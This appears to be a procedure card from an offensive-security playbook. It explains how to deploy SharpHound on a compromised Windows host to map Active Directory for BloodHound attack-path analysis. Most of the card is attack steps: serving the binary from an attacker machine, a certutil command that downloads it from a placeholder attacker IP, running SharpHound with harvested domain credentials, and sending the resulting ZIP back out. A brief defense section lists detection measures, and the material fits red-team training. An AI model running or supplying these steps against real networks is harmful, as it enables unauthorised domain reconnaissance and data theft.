---
id: d9c6fcf5-ebc7-4439-ac83-807ec8734fae
name: collect-ad-data-with-sharphound
type: procedure
verified: true
submitted: true
created_at: '2020-03-15T23:15:05.189638+00:00'
updated_at: '2023-05-25T19:44:18.124287+00:00'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[Domain Trust Discovery]]'
  - '[[Permission Groups Discovery]]'
sub_techniques: []
tags:
  - active-directory
  - enumeration
commands:
  - '[[commands/python3-http-server]]'
  - '[[commands/certutil-download-http]]'
  - '[[commands/sharphound-collect-all]]'
tools:
  - '[[tools/SharpHound]]'
platforms:
  - Windows
skill_level: intermediate
impact_level: medium
detection_risk: high
validated: true
---

# collect-ad-data-with-sharphound

## Summary

Deploy SharpHound on a compromised host to collect comprehensive Active Directory data including users, groups, ACLs, and trusts for BloodHound analysis.

## Description

SharpHound is a C# ingestor that queries LDAP and RPC to gather AD graph data, producing JSON files for import into BloodHound to visualize attack paths.

## Requirements

- Domain credentials or local access
- SharpHound.exe binary
- Network access to DC

## Defense

- Monitor for SharpHound processes (e.g., via Sysmon)
- Limit LDAP queries from workstations
- Use BloodHound detection rules

## Objectives

1. Enumerate AD objects
2. Capture ACLs and relationships
3. Generate importable data

## Instructions

### Step 1: Host SharpHound Binary

**Context**: Serve file from attacker machine for download.

**Command** ([[commands/python3-http-server]]):
```bash
python3 -m http.server 80
```

> Place SharpHound.exe in directory.

### Step 2: Download to Target

**Context**: Use built-in certutil to fetch binary.

**Command** ([[commands/certutil-download-http]]):
```command_prompt
certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/SharpHound.exe" "C:\Temp\SharpHound.exe"
```

> Downloads to temp path.

### Step 3: Execute Collection

**Context**: Run with all collection methods using creds.

**Command** ([[commands/sharphound-collect-all]]):
```command_prompt
SharpHound.exe -c All -d $_DOMAIN --ldapusername $_USER --ldappassword $_PASSWORD --outputdirectory C:\Temp
```

> Collects and zips data.

### Step 4: Exfiltrate ZIP

**Context**: Transfer back to attacker for analysis.

Use upload in shell or SMB.

> Clean up after.

## Expected Output

ZIP file with JSONs, e.g., 2023..._BloodHound.zip containing thousands of objects.
